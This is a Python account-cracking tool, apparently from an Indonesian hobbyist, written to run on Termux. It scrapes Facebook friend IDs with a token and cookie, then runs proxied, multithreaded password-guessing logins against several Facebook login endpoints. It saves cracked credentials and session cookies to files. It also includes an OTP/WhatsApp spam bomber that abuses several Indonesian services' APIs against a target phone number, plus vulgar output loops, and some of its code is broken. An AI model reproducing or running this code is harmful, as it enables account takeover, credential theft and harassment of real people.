import requests,json,os,sys,random,datetime,time,re,platform,rich,bs4
from rich.progress import Progress,SpinnerColumn,TextColumn,TimeElapsedColumn
from requests import get as Tamsis
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import track
from time import sleep as bobo
from os import system as termux
from rich.panel import Panel as pnl
from rich import print as cetak
#Aku Cuma Pemula,Kalo Banyak Kurang/Salah Jangan Di Buli Karna Saya masih SMP Om
#=========================Boleh Recode/Nyomot asal jangan Hapus Nama ane============================================Tamsis
#Sc Ini Akan Gw Update Terus Karna Banyak Yang Belum Beres Dan Banyak Metode Yang Belum Gw Tambah
id = []
usrgent2 = []
loop=0
ok,cp= 0,0
usragent=[]
limitd=0
cok=[]
metod=[]
umur=[]
token=[]
notik=[]
pwmu=[]
hijo = '\033[1;32m'
xxx = '\33[m'
udi=[]
mer = '\033[1;31m'
kun = '\033[1;33m'
uaa=[]
proxsi=open('socksku.txt','r').read().splitlines()

tg = datetime.datetime.now().day
bl = datetime.datetime.now().month
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

for i in range(10):
	ugn = random.choice(['Mozilla/5.0 (Linux; Android 13; SM-A536U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36 EdgA/113.0.1774.36','Mozilla/5.0 (Linux; Android 8.0.0; F5121) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 EdgA/112.0.1722.59','Mozilla/5.0 (Linux; Android 11; CPH2219) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 EdgA/110.0.1587.66','Mozilla/5.0 (Linux; Android 10; ONEPLUS A6000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36 EdgA/104.0.1293.60','Mozilla/5.0 (Linux; Android 12; vivo 1907) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 EdgA/111.0.1661.59'])
	usragent.append(ugn)
for xd in range(10):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
	c=random.choice(['SAMSUNG SM-T530','SAMSUNG SM-T805','SAMSUNG-SM-G530AZ','SAMSUNG SM-G925K','SAMSUNG SM-G925L','SAMSUNG SM-G925T','SAMSUNG-SM-T337A','SAMSUNG SM-J110F','SAMSUNG-SM-G890A','SAMSUNG SM-T355Y','SAMSUNG SM-T817T','SAMSUNG SM-G925F','SAMSUNG SM-G928F','SAMSUNG SM-W2021'])
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	kk=random.randrange(83,103)
	buil=random.choice(['Build/JZO54K)','Build/LMY47V)','Build/LMY48B)','Build/LRX22C)','Build/LRX21V) ','Build/LRX22G)','Build/LRX21T)'])
	e=random.choice(['EdgA/113.0.1774.36','','EdgA/112.0.1722.59','EdgA/110.0.1587.66','EdgA/104.0.1293.60','EdgA/111.0.1661.59',f'EdgA/1{random.randrange(10,15)}.0.1661.{random.randrange(30,66)}'])
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=f'{a} {b}; {c}) {d}{kk}.{g}.{h} {i} {e}'
	usragent.append(uaku)
for t in range(100000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
	c=random.choice(['SAMSUNG SM-T530','SAMSUNG SM-T805','SAMSUNG-SM-G530AZ','SAMSUNG SM-G925K','SAMSUNG SM-G925L','SAMSUNG SM-G925T','SAMSUNG-SM-T337A','SAMSUNG SM-J110F','SAMSUNG-SM-G890A','SAMSUNG SM-T355Y','SAMSUNG SM-T817T','SAMSUNG SM-G925F','SAMSUNG SM-G928F','SAMSUNG SM-W2021'])
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	kk=random.randrange(83,103)
	buil=random.choice(['Build/JZO54K)','Build/LMY47V)','Build/LMY48B)','Build/LRX22C)','Build/LRX21V) ','Build/LRX22G)','Build/LRX21T)'])
	e=random.choice(['SamsungBrowser/3.0','SamsungBrowser/3.1','SamsungBrowser/3.2','SamsungBrowser/3.3','SamsungBrowser/3.4','SamsungBrowser/3.5','SamsungBrowser/3.6','SamsungBrowser/3.7','SamsungBrowser/3.8','SamsungBrowser/3.9','SamsungBrowser/4.0','SamsungBrowser/2.0','SamsungBrowser/2.1','SamsungBrowser/2.2','SamsungBrowser/2.3','SamsungBrowser/2.4','SamsungBrowser/2.5','SamsungBrowser/2.6','SamsungBrowser/2.7','SamsungBrowser/2.8','SamsungBrowser/2.9','SamsungBrowser/1.0','SamsungBrowser/1.1','SamsungBrowser/1.2','SamsungBrowser/5.0','SamsungBrowser/5.1','SamsungBrowser/5.2','SamsungBrowser/5.3','SamsungBrowser/5.4','SamsungBrowser/5.5','SamsungBrowser/5.6','SamsungBrowser/5.7','SamsungBrowser/5.8','SamsungBrowser/5.9','SamsungBrowser/6.0','SamsungBrowser/6.1','SamsungBrowser/19.0','SamsungBrowser/20.0','SamsungBrowser/21.0','SamsungBrowser/18.0','SamsungBrowser/17.0','SamsungBrowser/16.0','SamsungBrowser/15.0'])
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uakuh=f'{a} {b}; {c} {buil} {d}{kk}.{g}.{h} {i} {e}'
	uakuh1=f'{a} {b}; {c} {buil} {d}{kk}.{g}.{h} {i} {e}'
	uaku2 = random.choice([uakuh,uakuh1])
	usrgent2.append(uaku2)
p = open('useragent.txt','r').read().splitlines()
for u in p:
	usrgent2.append(u) or usragent.append(u)
termux('clear')
#####################bagian ini untuk mengecek cookie/token################Tamsis
#####################pemberitahuan update juga disini######################
def notic():
	try :
		f = Tamsis('https://graph.facebook.com/v16.0/100066790856758?fields=posts.limit(1)&access_token='+token[0],cookies={'cookie': cok[0]}).json()
		for bot in f['posts']['data']:
			p=(bot['message'])
			notik.append(p)
			termux('clear')
			menu()
	except:cetak(pnl('Gagal Login\nMungkin Token/cookie kamu salah'));exit()
#######################bagian menu####################################Tamsis
def menu():
	logo()
	try:
		cetak(pnl('[yellow]'+notik[0],width=95,padding=(0,1),style=f"blue"))
	except:pass
	cetak(pnl("""[green]Author        : Tamsis
facebook      : Yudz Xyon
Github        : MrYudzz""",width=95,padding=(0,1),style=f"blue"))
	cetak(pnl("""[white][ 1 ] Crack File
[ 2 ] Buat File Dump
[ 3 ] Crack ID Publik
[ 4 ] Spam Wa
[ 5 ] Crack ID Publik Massal
[ 6 ] Crack ID Random
[ 7 ] Tambah User-Agent Acak
[ 77 ] Lihat Daftar User-Agent Acak""",width=95,padding=(0,1),style=f"blue"))
	i = input('pilih : ')
	if i in ['2']:
		i = input('Buat Nama File : DUMP/')
		print('Ketik (stop) Untuk Berhenti Dump')
		fil(i)
		c = open('DUMP/'+i,"r").readlines()
		print(f'total {len(c)} id terkumpul di File:DUMP/{i}')
	elif i in ['1']:
		mulai()
	elif i in ['3']:
		cetak(pnl("""[white][ 1 ] Dump ID Tua[ 2011-2015 ]
[ 2 ] Dump ID Muda[ 2016-2023 ]
[ 3 ] Dump Semua ID
[white][ 4 ] [red]Dump ID Tua[ 2009-2010 ]
[white][ 5 ] [red]Dump ID Tua[ 2009 ]""",width=95,padding=(0,1),style=f"blue"))
		p = input('PILIH : ')
		if p in ['1']:umur.append('tua')
		elif p in ['2']:umur.append('muda')
		elif p in ['3']:umur.append('tamsis')
		elif p in ['4']:umur.append('sepuh')
		elif p in ['5']:umur.append('modar')
		else:umur.append('tamsis')
		dump('2')
		print('\nTotal '+str(len(id))+' ID Terkumpul')
		ngatur()
	elif i in ['4']:
		spamwa()
		
	elif i in ['5'] :
		cetak(pnl("""[white][ 1 ] Dump ID Tua[ 2011-2015 ]
[ 2 ] Dump ID Muda[ 2016-2023 ]
[ 3 ] Dump Semua ID
[white][ 4 ] [red]Dump ID Tua[ 2009-2010 ]
[white][ 5 ] [red]Dump ID Tua[ 2009 ]""",width=95,padding=(0,1),style=f"blue"))
		p = input('PILIH : ')
		if p in ['1']:umur.append('tua')
		elif p in ['2']:umur.append('muda')
		elif p in ['3']:umur.append('tamsis')
		elif p in ['4']:umur.append('sepuh')
		elif p in ['5']:umur.append('modar')
		else:umur.append('tamsis')
		dump('1')
	elif i in ['6']:print('Belum');exit()
	elif i in ['7']:
		cetak(pnl('Tambah Berapa User-Agent Acak : '))
		jum = input ('Jumlah : ')
		ke=1
		for i in range(int(jum)):
			cetak(pnl('Masulan User-Agent Ke {ke}'))
			qq = input('Input : ')
			usragent.append(qq)
			usrgent2.append(qq)
			ke+=1
	elif i in['77']:
		jum=1
		for usr in usrgent2 or usragent :	
			cetak(pnl('[ '+str(jum)+' ]'+usr,width=95,padding=(0,1),style=f"blue"))
			jum+=1
	else:
		cetak('pilih yang bener')
		bobo(1)
		for i in range(1000000):
			haha=random.choice(['kontol','memek'])
			cetak(pnl(haha,width=95,padding=(0,1),style=f"blue"))
			bobo(0.010)
######################logo jangan di ubah ye##############Tamsis
def logo():
	cetak(pnl(f"""[cyan]              __  __ _____ _   _  ____ ____  _____ _____
             |  \/  | ____| \ | |/ ___|  _ \| ____|_   _|
             | |\/| |  _| |  \| | |   | |_) |  _|   | |       [green]  V1.4
             | |  | | |___| |\  | |___|  _ <| |___  | |
             |_|  |_|_____|_| \_|\____|_| \_\_____| |_|[white]
""",width=95,padding=(0,1),style=f"green"))
#####################################Dump ID to file####################Tamsis
def fil(file):
	ke=1
	for i in range(100):
		u = input('\nMasukan ID ke '+str(ke)+' : ')
		if 'stop' in u : break
		else:
			p = Tamsis(f'https://graph.facebook.com/v2.0/{u}?fields=friends.limit(5000)&access_token='+token[0],cookies={'cookie': cok[0]}).json()
			try:
				print(p['error']['message']);continue
			except KeyError:
				try:
					h=0
					for i in p['friends']['data']:
						c = (i['id']+'|'+i['name'])
						open('DUMP/'+file,"a").write(f'\n{c}')
						print(f'\rberhasil dump {h} ID',end='')
						sys.stdout.flush()
						
						h+=1
					print(f'\n{h} id berhasil di tambahkan ke File:{file}')
				except KeyError:print('Gagal Dump ID\n[ ! ]ID Harus Public');continue
def mulai():
	try:
		os.listdir('DUMP')
		termux('ls DUMP')
	except FileNotFoundError:print('File tidak di temukan')
	try:
		nama = input('pilih file : /SCFB/DUMP/')
		p = open('DUMP/'+nama,'r').read().splitlines()
		for idz in p :
			id.append(idz)
		ngatur()
	except FileNotFoundError:print('pilih yang bener')
	except IsADirectoryError:
		print('pilih yang bener')
		menu()
########################lah ngatur#######################Tamsis
def ngatur():
	cetak(pnl('[white][ 1 ] mbasic async\n[ 2 ] mobile reguler[Next]\n[ 3 ] alpha async\n[ 4 ] free regular\n[ 5 ] latest async',width=95,padding=(0,1),style=f"blue"))
	mtd = input('pilih : ')
	if mtd in ['1']:metod.append('asin')
	elif mtd in ['3']:metod.append('asin_x')
	elif mtd in ['4']:metod.append('frereg')
	elif mtd in ['5']:metod.append('late')
	else:cetak(pnl('Tunggu Update Bng',width=95,padding=(0,1),style=f"blue"))
	cetak(pnl('[white]Ketik (N) Jika Tidak Ingin Menambah Password',width=95,padding=(0,1),style=f"blue"))
	p = input('Tambahan Berapa Password: ')
	if p in ['N','n']:pwmu.append('N' or 'n')
	else:
		for i in range(int(p)):
			ggg = input('Password Manual : ')	
			pwmu.append(ggg)
	cetak(pnl('[white]Ketik (N) Jika Ingin Menggunakan User-Agent Acak',width=95,padding=(0,1),style=f"blue"))
	c = input('Tambah Berapa User-Agent Manual ? : ')
	if c in ['N','n']:
		for u in usragent:uaa.append(u)
	else:
		for i in range(int(c)):
			cc = input('User-Agent Manual :')
			uaa.append(cc)
	passwrdh()
############################################paswor########################Tamsis
def passwrdh():
	global prog,des
	prog = Progress(SpinnerColumn('bouncingBall'),TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as otw:
			for kintil in id:
				try:
					user,name = kintil.split('|')[0],kintil.split('|')[1].lower()
				except IndexError:pass
				awl = name.split(' ')[0]
				if len(user)<14:continue
				else:pass
				pwv = []
				pwt = []
				if len(name)<6:
					if len(awl)<3:pwv.append('memek');pwv.append('jancok');pwv.append('sayang')
					else:pwv.append(awl+'321');pwv.append(awl+'123');pwv.append(awl+'1234');pwv.append(awl+'12345');pwv.append(awl+'123456');pwv.append('memekk');pwv.append('jancok');pwv.append('sayang')
				else:
					if len(awl)<3:pwv.append(name);pwv.append('memekk');pwv.append('jancok');pwv.append('sayang')
					else:
						pwv.append(name);pwv.append(awl+'321');pwv.append(awl+'123');pwv.append(awl+'1234');pwv.append(awl+'12345');pwv.append(awl+'123456');pwv.append('memekk');pwv.append('jancok');pwv.append('sayang')
				if pwmu in ['N','n','']:pass
				
				else:
					for xpwn in pwmu:
						pwv.append(xpwn)
			
				if 'asin' in metod:otw.submit(mbasic,user,pwv)
				elif 'asin_x' in metod:otw.submit(alpa,user,pwv)
				elif 'frereg' in metod:otw.submit(freereg,user,pwv)
				elif 'late' in metod:otw.submit(lates,user,pwv)
				else:otw.submit(slebw,user,pwv)
		print('Crack Selesai Tetap Bersyukur Walau Banyak CP')
		exit()
#####################################Ngentod################################Tamsis
def alpa(user,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[green][ {user} ] [white]{(loop)}/{len(id)}[/] | [green]OK:{ok} |{kun}| CP:{cp} |')
	prog.advance(des)
	ua = random.choice(uaa)
	tamsis = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			kode = tamsis.get('https://x.alpha.facebook.com').text
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(kode)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),"li":re.search('name="li" value="(.*?)"', str(kode)).group(1),"try_number":"0","unrecognized_tries":"0","email":user,"pass":pw,"login":"Log In"}
			hulu = {
'Host': 'x.alpha.facebook.com',
'content-length': '2162',
'x-fb-lsd': 'AVoImhtP_ms',
'content-type': 'application/x-www-form-urlencoded',
'x-asbd-id': '198387',
'sec-ch-ua-mobile': '?1',
'user-agent': ua,
'sec-ch-ua-platform': 'Android',
'accept': '*/*',
'origin': 'https://x.alpha.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://x.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			tamsis.post('https://x.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=hulu,proxies=proxs).text
			login=ses.cookies.get_dict().keys()
			if 'c_user' in login:
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print(f'\r{hijo}{user}|{pw}|{kuki}{xxx}')
				open('/sdcard/AKUN-OK/'+okh,'a').write(user+'|'+pw+'|'+kuki+'\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print(f'\r{kun}{user}|{pw}{xxx}')
				open('/sdcard/AKUN-CP/'+cph,'a').write(user+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1	
def mbasic(user,pwv):				
	global loop,ok,cp
	prog.update(des,description=f'\r[green][ {user} ] [white]{(loop)}/{len(id)}[/] | [green]OK:{ok} |{kun}| CP:{cp} |')
	prog.advance(des)
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in pwv:
		try:
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			mbasic_fb = tamsis.get('https://mbasic.facebook.com').text
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(mbasic_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(mbasic_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(mbasic_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(mbasic_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":user,"pass":pw,"login":"Log In"}
			hulu = {"authority": 'mbasic.facebook.com',"method": 'GET',"scheme": 'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
			tamsis.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=hulu,allow_redirects=False,proxies=proxs).text
			login=ses.cookies.get_dict().keys()
			if 'c_user' in login:
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print(f'\r{hijo}{user}|{pw}|{kuki}{xxx}')
				open('/sdcard/AKUN-OK/'+okh,'a').write(user+'|'+pw+'|'+kuki+'\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print(f'\r{kun}{user}|{pw}{xxx}')
				open('/sdcard/AKUN-CP/'+cph,'a').write(user+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def lates(user,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[green][ {user} ] [white]{(loop)}/{len(id)}[/] | [green]OK:{ok} |{kun}| CP:{cp} |')
	prog.advance(des)
	ua = random.choice(uaa)
	tamsis=requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			hulu = {"Host": "m.latest.facebook.com","content-length": "2142","x-fb-lsd": "AVr2PTWFBX0","sec-ch-ua": "'Not:A-Brand';v='99', 'Chromium';v='112'","content-type": "application/x-www-form-urlencoded","x-asbd-id": "198387","sec-ch-ua-mobile": "?0","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","sec-ch-ua-platform": "Linux","accept": "*/*","origin": "https://m.latest.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.latest.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			kode=tamsis.get('https://m.latest.facebook.com/login/device-based/login/async').text
			data={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':user,'pass':pw}
			tamsis.post('https://m.latest.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print(f'\r{hijo}{user}|{pw}|{kuki}{xxx}')
				open('/sdcard/AKUN-OK/'+okh,'a').write(user+'|'+pw+'|'+kuki+'\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print(f'\r{kun}{user}|{pw}{xxx}')
				open('/sdcard/AKUN-CP/'+cph,'a').write(user+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def freereg(user,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[green][ {user} ] [white]{(loop)}/{len(id)}[/] | [green]OK:{ok} |{kun}| CP:{cp} |')
	prog.advance(des)
	ua = random.choice(uaa)
	ses = requests.Session()
	tamsis=requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			hulu={'Host': 'free.facebook.com','content-length': '169','cache-control': 'max-age=0','viewport-width': '980','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','sec-ch-ua-platform-version': '9.0.0','sec-ch-prefers-color-scheme': 'light','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			kode=tamsis.get('https://free.facebook.com/login/device-based/regular/login/').text
			data={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':user,'pass':pw}
			tamsis.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=hulu,proxies=proxs).text
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print(f'\r{hijo}{user}|{pw}|{kuki}{xxx}')
				open('/sdcard/AKUN-OK/'+okh,'a').write(user+'|'+pw+'|'+kuki+'\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print(f'\r{kun}{user}|{pw}{xxx}')
				open('/sdcard/AKUN-CP/'+cph,'a').write(user+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
##################################Spam Wa###########################Tamsis
def spamwa():
	nomer = input(f"Masukan No WA Target : +628")
	open("nomer.txt", "w").write(nomer)
	jum = input("Berapa Putaran : ")
	for i in range(int(jum)):
		nomer = open('nomer.txt','r').read()
		headers_carsome = {'Host': 'www.carsome.id','content-length': '38','accept': 'application/json, text/plain, */*','x-language': 'id','x-token': '','country': 'ID','x-amplitude-device-id': 'QbOr1g4RMMMIpnkg7JVqx7','user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36','content-type': 'application/json','origin': 'https://www.carsome.id','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.carsome.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		data_carsome = json.dumps({"username":"8"+nomer,"optType":1})
		pos_carsome = requests.post("https://www.carsome.id/website/login/sendSMS",headers=headers_carsome,data=data_carsome).text
		nomer = open('nomer.txt','r').read()
		head2 = {"Host": "api.pintarnya.com","content-length": "27","origin": "https://pintarnya.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","content-type": "application/json","accept": "application/json, text/plain, */*","cache-control": "no-cache","platform": "web-kerja","save-data": "on","referer": "https://pintarnya.com/kerja/signup","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		data2 = json.dumps({"mobile":"+628"+nomer})
		pos_pintar = requests.post("https://api.pintarnya.com/api/pk/auth/register/mobile",headers=head2,data=data2).text
		nomer = open('nomer.txt','r').read()
		head3 = {"Host": "gql.tokopedia.com","content-length": "800","x-version": "d626b2d","origin": "https://www.tokopedia.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","content-type": "application/json","accept": "*/*","x-source": "tokopedia-lite","save-data": "on","x-device": "tokopedia-lite","x-tkpd-lite-service": "atreus","x-tkpd-akamai": "otp","referer": "https://www.tokopedia.com/register?ld=https%3A%2F%2Fseller.tokopedia.com%2Fhome","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		data3 = json.dumps([{"operationName":"OTPRequest","variables":{"msisdn":"628"+nomer,"otpType":"116","mode":"whatsapp","otpDigit":6},"query":"query OTPRequest($otpType: String!, $mode: String, $msisdn: String, $email: String, $otpDigit: Int, $ValidateToken: String, $UserIDEnc: String, $UserIDSigned: Int, $Signature: String, $MsisdnEnc: String, $EmailEnc: String) {\n OTPRequest(otpType: $otpType, mode: $mode, msisdn: $msisdn, email: $email, otpDigit: $otpDigit, ValidateToken: $ValidateToken, UserIDEnc: $UserIDEnc, UserIDSigned: $UserIDSigned, Signature: $Signature, MsisdnEnc: $MsisdnEnc, EmailEnc: $EmailEnc) {\n success\n message\n errorMessage\n sse_session_id\n list_device_receiver\n error_code\n message_title\n message_sub_title\n message_img_link\n __typename\n }\n}\n"}])
		pos_tokped = requests.post("https://gql.tokopedia.com/graphql/OTPRequest",headers=head3,data=data3).text
		nomer = open('nomer.txt','r').read()
		head4 = {"Host": "api.dagangan.com","accept": "application/json","content-type": "application/json","content-length": "48","accept-encoding": "gzip","user-agent": "okhttp/3.12.12"}
		data4 = json.dumps({"phone":"08"+nomer,"otp_method":"whatsapp"})
		r = requests.post("https://api.dagangan.com/v2/users/sms",headers=head4,data=data4).text
		nomer = open('nomer.txt','r').read()
		head5 = { "Host": "api-v2.bukuwarung.com","authorization": "Bearer","x-request-source": "seller-app","x-app-version-name": "1.2.5","x-app-device": "Samsung SM-J330G","support-token": "5QEFaKytbhYvoA8gjYAmvw68l1kxmlqUfj5ygtCKZOVtUc1MbN","buku-origin": "tokoko","x-app-version-code": "135","content-type": "application/json; charset=UTF-8","content-length": "227","accept-encoding": "gzip","user-agent": "okhttp/4.9.0"}
		data5 = json.dumps({"action":"LOGIN_OTP","clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn","countryCode":"62","deviceId":"92dd6e10-560b-4886-8605-46b3d9fe2288","method":"WA","phone":"8"+nomer})
		op = requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers=head5,data=data5)
		nomer = open('nomer.txt','r').read()
		head6 = {"Host": "www.desty.app","content-length": "115","accept": "application/json, text/plain, */*","cookies": "null","origin": "https://www.desty.app","save-data": "on","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","referer": "https://www.desty.app/common/signup?utm_source=paidads&utm_medium=ggsem&utm_campaign=DPSEM&utm_content=CaraBisnis&gclid=Cj0KCQjw2v-gBhC1ARIsAOQdKY1gpUCSpscobmlPhQXQHUGNSs_0cAi7QTKr0DxeejusxywvC8MI84UaAhBUEALw_wcB&productBusinessSource=page","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		data6 = json.dumps({"address":"+628"+nomer,"expire":"true","type":"WHATSAPP","situation":"REGISTER","language":"id","source":"Page"})
		pos6 = requests.post("https://www.desty.app/api/captcha",headers=head6,data=data6).text
		nomer = open('nomer.txt','r').read()
		head7 ={"user-agent": "Dart/2.16 (dart:io)","accept": "application/json","accept-encoding": "gzip","content-length": "109","host": "api-app.primaku.com","content-type": "application/json; charset=utf-8","apiversion": "2303231"}
		data7 = json.dumps({"role":"PARENT","phoneNumber":"628"+nomer,"register":"true","isSocial":"false","email":"cekontol@gmail.com"})
		p = requests.post("https://api-app.primaku.com/auth/v2/send-otp",headers=head7,data=data7).text
		nomer = open('nomer.txt','r').read()
